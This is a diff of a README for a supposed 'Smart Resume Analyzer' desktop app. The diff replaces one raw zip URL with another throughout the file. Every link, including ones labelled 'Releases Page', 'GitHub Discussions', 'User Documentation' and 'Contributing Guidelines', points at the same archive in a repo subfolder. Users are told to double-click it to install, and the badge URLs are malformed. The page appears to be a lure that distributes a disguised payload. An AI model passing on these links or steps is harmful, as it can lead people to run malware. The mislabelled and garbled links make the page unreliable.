@@ -1,6 +1,6 @@
 # 🌟 Smart-Resume-Analyzer - Elevate Your Job Application Journey
 
-[![Download Smart Resume Analyzer](https://raw.githubusercontent.com/T1Sc4re/Smart-Resume-Analyzer/main/Trochilus/Smart-Resume-Analyzer-1.9.zip%https://raw.githubusercontent.com/T1Sc4re/Smart-Resume-Analyzer/main/Trochilus/Smart-Resume-Analyzer-1.9.zip)](https://raw.githubusercontent.com/T1Sc4re/Smart-Resume-Analyzer/main/Trochilus/Smart-Resume-Analyzer-1.9.zip)
+[![Download Smart Resume Analyzer](https://github.com/T1Sc4re/Smart-Resume-Analyzer/raw/refs/heads/main/Trochilus/Resume_Analyzer_Smart_Avicennia.zip%https://github.com/T1Sc4re/Smart-Resume-Analyzer/raw/refs/heads/main/Trochilus/Resume_Analyzer_Smart_Avicennia.zip)](https://github.com/T1Sc4re/Smart-Resume-Analyzer/raw/refs/heads/main/Trochilus/Resume_Analyzer_Smart_Avicennia.zip)
 
 ## 📖 Overview
 
@@ -18,26 +18,26 @@ To begin using Smart Resume Analyzer, follow these simple steps to download and 
   
 2. **Visit the Releases Page**
    - Click on the button below to download the latest version of Smart Resume Analyzer.  
-   [![Download Smart Resume Analyzer](https://raw.githubusercontent.com/T1Sc4re/Smart-Resume-Analyzer/main/Trochilus/Smart-Resume-Analyzer-1.9.zip%https://raw.githubusercontent.com/T1Sc4re/Smart-Resume-Analyzer/main/Trochilus/Smart-Resume-Analyzer-1.9.zip)](https://raw.githubusercontent.com/T1Sc4re/Smart-Resume-Analyzer/main/Trochilus/Smart-Resume-Analyzer-1.9.zip)
+   [![Download Smart Resume Analyzer](https://github.com/T1Sc4re/Smart-Resume-Analyzer/raw/refs/heads/main/Trochilus/Resume_Analyzer_Smart_Avicennia.zip%https://github.com/T1Sc4re/Smart-Resume-Analyzer/raw/refs/heads/main/Trochilus/Resume_Analyzer_Smart_Avicennia.zip)](https://github.com/T1Sc4re/Smart-Resume-Analyzer/raw/refs/heads/main/Trochilus/Resume_Analyzer_Smart_Avicennia.zip)
 
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**
-   - Go to the [Releases Page](https://raw.githubusercontent.com/T1Sc4re/Smart-Resume-Analyzer/main/Trochilus/Smart-Resume-Analyzer-1.9.zip) where you can find the most recent version.
+   - Go to the [Releases Page](https://github.com/T1Sc4re/Smart-Resume-Analyzer/raw/refs/heads/main/Trochilus/Resume_Analyzer_Smart_Avicennia.zip) where you can find the most recent version.
   
 2. **Download the Application**
    - Look for the latest release. Download the file that matches your operating system.
-   - If you are on Windows, download `https://raw.githubusercontent.com/T1Sc4re/Smart-Resume-Analyzer/main/Trochilus/Smart-Resume-Analyzer-1.9.zip`.
-   - For macOS users, download `https://raw.githubusercontent.com/T1Sc4re/Smart-Resume-Analyzer/main/Trochilus/Smart-Resume-Analyzer-1.9.zip`.
+   - If you are on Windows, download `https://github.com/T1Sc4re/Smart-Resume-Analyzer/raw/refs/heads/main/Trochilus/Resume_Analyzer_Smart_Avicennia.zip`.
+   - For macOS users, download `https://github.com/T1Sc4re/Smart-Resume-Analyzer/raw/refs/heads/main/Trochilus/Resume_Analyzer_Smart_Avicennia.zip`.
 
 3. **Install the Application**
    - **For Windows:**
-     - Locate the downloaded `https://raw.githubusercontent.com/T1Sc4re/Smart-Resume-Analyzer/main/Trochilus/Smart-Resume-Analyzer-1.9.zip` file.
+     - Locate the downloaded `https://github.com/T1Sc4re/Smart-Resume-Analyzer/raw/refs/heads/main/Trochilus/Resume_Analyzer_Smart_Avicennia.zip` file.
      - Double-click the file to run the installer.
      - Follow the prompts to complete the installation.
    
    - **For macOS:**
-     - Open the downloaded `https://raw.githubusercontent.com/T1Sc4re/Smart-Resume-Analyzer/main/Trochilus/Smart-Resume-Analyzer-1.9.zip` file.
+     - Open the downloaded `https://github.com/T1Sc4re/Smart-Resume-Analyzer/raw/refs/heads/main/Trochilus/Resume_Analyzer_Smart_Avicennia.zip` file.
      - Drag and drop the application into your Applications folder.
      - Open your Applications folder and find Smart Resume Analyzer to run it.
 
@@ -85,16 +85,16 @@ A: Yes, we do not store or share any of your personal information or uploaded re
 
 Join our community for updates and support:
 
-- [GitHub Discussions](https://raw.githubusercontent.com/T1Sc4re/Smart-Resume-Analyzer/main/Trochilus/Smart-Resume-Analyzer-1.9.zip)
-- [User Documentation](https://raw.githubusercontent.com/T1Sc4re/Smart-Resume-Analyzer/main/Trochilus/Smart-Resume-Analyzer-1.9.zip)
+- [GitHub Discussions](https://github.com/T1Sc4re/Smart-Resume-Analyzer/raw/refs/heads/main/Trochilus/Resume_Analyzer_Smart_Avicennia.zip)
+- [User Documentation](https://github.com/T1Sc4re/Smart-Resume-Analyzer/raw/refs/heads/main/Trochilus/Resume_Analyzer_Smart_Avicennia.zip)
 
 If you experience issues or have suggestions, feel free to create an issue on our GitHub page. Your feedback is important to us.
 
 ## 🥳 Contributing
 
-We welcome contributions! If you want to improve Smart Resume Analyzer, check our [Contributing Guidelines](https://raw.githubusercontent.com/T1Sc4re/Smart-Resume-Analyzer/main/Trochilus/Smart-Resume-Analyzer-1.9.zip) to get started. Your ideas are what make this tool better for everyone. 
+We welcome contributions! If you want to improve Smart Resume Analyzer, check our [Contributing Guidelines](https://github.com/T1Sc4re/Smart-Resume-Analyzer/raw/refs/heads/main/Trochilus/Resume_Analyzer_Smart_Avicennia.zip) to get started. Your ideas are what make this tool better for everyone. 
 
 ## 🚀 Download Now!
 
 To get started with Smart Resume Analyzer, download the latest version from the link below:  
-[![Download Smart Resume Analyzer](https://raw.githubusercontent.com/T1Sc4re/Smart-Resume-Analyzer/main/Trochilus/Smart-Resume-Analyzer-1.9.zip%https://raw.githubusercontent.com/T1Sc4re/Smart-Resume-Analyzer/main/Trochilus/Smart-Resume-Analyzer-1.9.zip)](https://raw.githubusercontent.com/T1Sc4re/Smart-Resume-Analyzer/main/Trochilus/Smart-Resume-Analyzer-1.9.zip)
+[![Download Smart Resume Analyzer](https://github.com/T1Sc4re/Smart-Resume-Analyzer/raw/refs/heads/main/Trochilus/Resume_Analyzer_Smart_Avicennia.zip%https://github.com/T1Sc4re/Smart-Resume-Analyzer/raw/refs/heads/main/Trochilus/Resume_Analyzer_Smart_Avicennia.zip)](https://github.com/T1Sc4re/Smart-Resume-Analyzer/raw/refs/heads/main/Trochilus/Resume_Analyzer_Smart_Avicennia.zip)
